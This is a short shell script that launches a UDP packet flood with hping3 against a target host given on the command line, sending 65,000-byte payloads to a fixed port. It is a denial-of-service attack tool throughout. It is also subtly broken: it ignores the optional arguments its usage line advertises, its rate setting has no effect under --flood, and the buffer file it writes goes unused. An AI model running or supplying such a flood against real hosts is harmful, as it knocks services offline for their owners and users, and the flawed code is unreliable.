#!/bin/sh

TARGET=$1
PORT=12345
SIZE=65000
PPS=1000

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target> [port] [size] [pps]" >&2
  exit 1
fi

echo "[large packet] flood -> $TARGET:$PORT, payload=$SIZE, rate=$PPS pps"

head -c "$SIZE" /dev/zero > tmp/large.buf

exec hping3 \
     --flood \
     --udp \
     -p "$PORT" \
     -d "$SIZE" \
     -i u$((1000000 / PPS)) \
     "$TARGET"